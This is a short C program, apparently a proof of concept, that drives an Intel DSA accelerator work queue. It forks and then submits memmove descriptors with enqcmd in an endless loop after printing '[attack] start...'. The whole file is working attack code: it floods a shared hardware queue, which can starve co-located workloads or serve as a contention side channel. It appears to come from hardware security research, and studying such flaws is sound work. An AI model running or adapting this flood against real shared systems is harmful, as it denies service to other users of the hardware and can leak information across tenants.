#include "dsa.h"

#define BLEN (4096 << 4)

struct wq_info wq_info;
struct dsa_hw_desc desc = {};
struct dsa_completion_record comp __attribute__((aligned(32))) = {};

int main(int argc, char *argv[])
{
    char src[BLEN], dst[BLEN];
    memset(src, 0xCB, BLEN);

    int rc = map_wq(&wq_info);
    if (rc) return EXIT_FAILURE;

    desc.opcode          = DSA_OPCODE_MEMMOVE;
    desc.flags           = IDXD_OP_FLAG_RCR \
                         | IDXD_OP_FLAG_CRAV;
    desc.xfer_size       = BLEN;
    desc.src_addr        = (uintptr_t) src;
    desc.dst_addr        = (uintptr_t) dst;
    desc.completion_addr = (uintptr_t) &comp;

    fork();
    printf("[attack] start...\n");

    for(;;) {
        enqcmd(wq_info.wq_portal, &desc);
    } 

    return 0;
}
